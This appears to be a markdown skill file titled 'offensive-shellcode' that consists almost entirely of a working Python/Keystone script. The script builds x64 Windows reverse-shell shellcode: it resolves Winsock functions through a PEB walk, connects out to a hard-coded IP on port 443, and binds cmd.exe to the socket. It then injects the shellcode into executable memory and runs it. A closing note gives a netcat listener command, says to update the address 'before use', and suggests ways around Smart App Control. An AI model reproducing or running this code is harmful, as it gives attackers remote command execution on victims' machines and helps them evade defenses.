---
name: offensive-shellcode
description: "> **Windows 11 23H2:** Smart App Control may block outbound TCP 443/4444 to local subnets."
domain: cybersecurity
---

## Full x64 Reverse Shell Shellcode (Windows)

Complete Python/Keystone example implementing PEB walk → `GetProcAddress` → `LoadLibraryA` → Winsock connect → `CreateProcessA(cmd.exe)`:

```python
import ctypes, struct
from keystone import *

CODE = (
# Locate kernel32 Base Address
    " start:                         "
    "   add rsp, 0xfffffffffffffdf8 ;" # Avoid Null Byte and make some space
    " find_kernel32:                 "
    "   int3                        ;" # WinDbg breakpoint (disable for release)
    "   xor rcx, rcx                ;"
    "   mov rax, gs:[rcx + 0x60]    ;" # RAX = PEB
    "   mov rax, [rax + 0x18]       ;" # RAX = PEB->Ldr
    "   mov rsi, [rax + 0x20]       ;" # RSI = InMemoryOrderModuleList
    "   lodsq                       ;"
    "   xchg rax, rsi               ;"
    "   lodsq                       ;"
    "   mov rbx, [rax + 0x20]       ;" # RBX = kernel32 base
    "   mov r8, rbx                 ;"
# Parse Export Address Table
    "   mov ebx, [rbx+0x3C]         ;" # PE signature offset
    "   add rbx, r8                 ;" # RBX = PE header
    "   xor r12,r12                 ;"
    "   add r12, 0x88FFFFF          ;"
    "   shr r12, 0x14               ;"
    "   mov edx, [rbx+r12]          ;" # EAT RVA
    "   add rdx, r8                 ;" # RDX = EAT VA
    "   mov r10d, [rdx+0x14]        ;" # NumberOfFunctions
    "   xor r11, r11                ;"
    "   mov r11d, [rdx+0x20]        ;" # AddressOfNames RVA
    "   add r11, r8                 ;" # AddressOfNames VA
# Find GetProcAddress
    "   mov rcx, r10                ;"
    " k32findfunction:               "
    "   jecxz functionfound         ;"
    "   xor ebx,ebx                 ;"
    "   mov ebx, [r11+4+rcx*4]      ;" # Function name RVA
    "   add rbx, r8                 ;" # Function name VA
    "   dec rcx                     ;"
    "   mov rax, 0x41636f7250746547 ;" # 'GetProcA'
    "   cmp [rbx], rax              ;"
    "   jnz k32findfunction         ;"
# Get function address
    " functionfound:                 "
    "   xor r11, r11                ;"
    "   mov r11d, [rdx+0x24]        ;" # AddressOfNameOrdinals RVA
    "   add r11, r8                 ;"
    "   inc rcx                     ;"
    "   mov r13w, [r11+rcx*2]       ;" # Ordinal
    "   xor r11, r11                ;"
    "   mov r11d, [rdx+0x1c]        ;" # AddressOfFunctions RVA
    "   add r11, r8                 ;"
    "   mov eax, [r11+4+r13*4]      ;"
    "   add rax, r8                 ;" # GetProcAddress VA
    "   mov r14, rax                ;" # R14 = GetProcAddress
# Resolve LoadLibraryA
    "   mov rcx, 0x41797261         ;"
    "   push rcx                    ;"
    "   mov rcx, 0x7262694c64616f4c ;"
    "   push rcx                    ;" # 'LoadLibraryA'
    "   mov rdx, rsp                ;"
    "   mov rcx, r8                 ;" # kernel32 base
    "   sub rsp, 0x30               ;"
    "   call r14                    ;" # GetProcAddress(kernel32, LoadLibraryA)
    "   add rsp, 0x40               ;"
    "   mov rsi, rax                ;" # RSI = LoadLibraryA
# LoadLibrary("WS2_32.dll")
    "   xor rax, rax                ;"
    "   mov rax, 0x6C6C             ;"
    "   push rax                    ;"
    "   mov rax, 0x642E32335F325357 ;"
    "   push rax                    ;" # 'WS2_32.dll'
    "   mov rcx, rsp                ;"
    "   sub rsp, 0x30               ;"
    "   call rsi                    ;" # LoadLibraryA("WS2_32.dll")
    "   mov r15, rax                ;" # R15 = WS2_32 base
    "   add rsp, 0x40               ;"
# WSAStartup
    "   mov rax, 0x7075             ;"
    "   push rax                    ;"
    "   mov rax, 0x7472617453415357 ;"
    "   push rax                    ;" # 'WSAStartup'
    "   mov rdx, rsp                ;"
    "   mov rcx, r15                ;"
    "   sub rsp, 0x30               ;"
    "   call r14                    ;" # GetProcAddress(ws2_32, WSAStartup)
    "   add rsp, 0x40               ;"
    "   mov r12, rax                ;"
    "   xor rcx,rcx                 ;"
    "   mov cx,408                  ;"
    "   sub rsp,rcx                 ;"
    "   lea rdx,[rsp]               ;" # lpWSAData
    "   mov cx,514                  ;" # wVersionRequired = 2.2
    "   sub rsp,88                  ;"
    "   call r12                    ;" # WSAStartup
# WSASocketA — create socket
    "   mov rax, 0x4174             ;"
    "   push rax                    ;"
    "   mov rax, 0x656b636f53415357 ;"
    "   push rax                    ;" # 'WSASocketA'
    "   mov rdx, rsp                ;"
    "   mov rcx, r15                ;"
    "   sub rsp, 0x30               ;"
    "   call r14                    ;"
    "   add rsp, 0x40               ;"
    "   mov r12, rax                ;"
    "   sub rsp,0x208               ;"
    "   xor rdx, rdx                ;"
    "   sub rsp, 88                 ;"
    "   mov [rsp+32], rdx           ;"
    "   mov [rsp+40], rdx           ;"
    "   inc rdx                     ;"
    "   mov rcx, rdx                ;"
    "   inc rcx                     ;"
    "   xor r8,r8                   ;"
    "   add r8,6                    ;"
    "   xor r9,r9                   ;"
    "   mov r9w,98*4                ;"
    "   mov ebx,[r15+r9]            ;"
    "   xor r9,r9                   ;"
    "   call r12                    ;" # WSASocketA
    "   mov r13, rax                ;" # R13 = socket handle
    "   add rsp, 0x208              ;"
# WSAConnect — connect to C2
    "   mov rax, 0x7463             ;"
    "   push rax                    ;"
    "   mov rax, 0x656e6e6f43415357 ;"
    "   push rax                    ;" # 'WSAConnect'
    "   mov rdx, rsp                ;"
    "   mov rcx, r15                ;"
    "   sub rsp, 0x30               ;"
    "   call r14                    ;"
    "   add rsp, 0x40               ;"
    "   mov r12, rax                ;"
    "   mov rcx, r13                ;" # socket handle
    "   sub rsp,0x208               ;"
    "   xor rax,rax                 ;"
    "   inc rax                     ;"
    "   inc rax                     ;"
    "   mov [rsp], rax              ;" # AF_INET = 2
    "   mov rax, 0xbb01             ;" # Port 443 (big-endian)
    "   mov [rsp+2], rax            ;"
    "   mov rax, 0x31061fac         ;" # IP 172.31.6.49 — UPDATE THIS
    "   mov [rsp+4], rax            ;"
    "   lea rdx,[rsp]               ;"
    "   mov r8, 0x16                ;" # sizeof(sockaddr_in)
    "   xor r9,r9                   ;"
    "   push r9                     ;"
    "   push r9                     ;"
    "   push r9                     ;"
    "   sub rsp, 0x88               ;"
    "   call r12                    ;" # WSAConnect
# Re-locate kernel32 and resolve CreateProcessA
    "   xor rcx, rcx                ;"
    "   mov rax, gs:[rcx + 0x60]    ;"
    "   mov rax, [rax + 0x18]       ;"
    "   mov rsi, [rax + 0x20]       ;"
    "   lodsq                       ;"
    "   xchg rax, rsi               ;"
    "   lodsq                       ;"
    "   mov rbx, [rax + 0x20]       ;"
    "   mov r8, rbx                 ;"
    "   mov rax, 0x41737365636f     ;"
    "   push rax                    ;"
    "   mov rax, 0x7250657461657243 ;"
    "   push rax                    ;" # 'CreateProcessA'
    "   mov rdx, rsp                ;"
    "   mov rcx, r8                 ;"
    "   sub rsp, 0x30               ;"
    "   call r14                    ;"
    "   add rsp, 0x40               ;"
    "   mov r12, rax                ;" # R12 = CreateProcessA
# Push cmd.exe + build STARTUPINFOA
    "   mov rax, 0x6578652e646d63   ;"
    "   push rax                    ;" # 'cmd.exe'
    "   mov rcx, rsp                ;" # lpApplicationName
    "   push r13                    ;" # hStdError = socket
    "   push r13                    ;" # hStdOutput = socket
    "   push r13                    ;" # hStdInput = socket
    "   xor rax,rax                 ;"
    "   push ax                     ;"
    "   push rax                    ;"
    "   push rax                    ;"
    "   mov rax, 0x100              ;" # STARTF_USESTDHANDLES
    "   push ax                     ;"
    "   xor rax,rax                 ;"
    "   push ax                     ;"
    "   push ax                     ;"
    "   push rax                    ;"
    "   push rax                    ;"
    "   push rax                    ;"
    "   push rax                    ;"
    "   push rax                    ;"
    "   push rax                    ;"
    "   mov rax, 0x68               ;"
    "   push rax                    ;" # cb = 0x68
    "   mov rdi,rsp                 ;" # RDI = &STARTUPINFOA
# Call CreateProcessA
    "   mov rax, rsp                ;"
    "   sub rax, 0x500              ;"
    "   push rax                    ;" # lpProcessInformation
    "   push rdi                    ;" # lpStartupInfo
    "   xor rax, rax                ;"
    "   push rax                    ;" # lpCurrentDirectory = NULL
    "   push rax                    ;" # lpEnvironment = NULL
    "   push rax                    ;"
    "   inc rax                     ;"
    "   push rax                    ;" # bInheritHandles = TRUE
    "   xor rax, rax                ;"
    "   push rax                    ;"
    "   push rax                    ;"
    "   push rax                    ;"
    "   push rax                    ;" # dwCreationFlags = 0
    "   mov r8, rax                 ;" # lpThreadAttributes = NULL
    "   mov r9, rax                 ;" # lpProcessAttributes = NULL
    "   mov rdx, rcx                ;" # lpCommandLine = 'cmd.exe'
    "   mov rcx, rax                ;" # lpApplicationName = NULL
    "   call r12                    ;" # CreateProcessA
)

ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ctypes.windll.kernel32.RtlCopyMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
ctypes.windll.kernel32.CreateThread.argtypes = (
    ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
    ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int),
)

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0), ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000), ctypes.c_int(0x40)
)
buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, ctypes.c_int(len(shellcode)))

print("Shellcode at %s" % hex(ptr))
input("Press ENTER to execute...")

ht = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(ptr),
    ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)),
)
ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
```

> **Note:** Update IP (`0x31061fac`) and port (`0xbb01`) before use. Listener: `nc -nvlp 443`
>
> **Windows 11 23H2:** Smart App Control may block outbound TCP 443/4444 to local subnets. Use a non-standard port or a named-pipe payload.
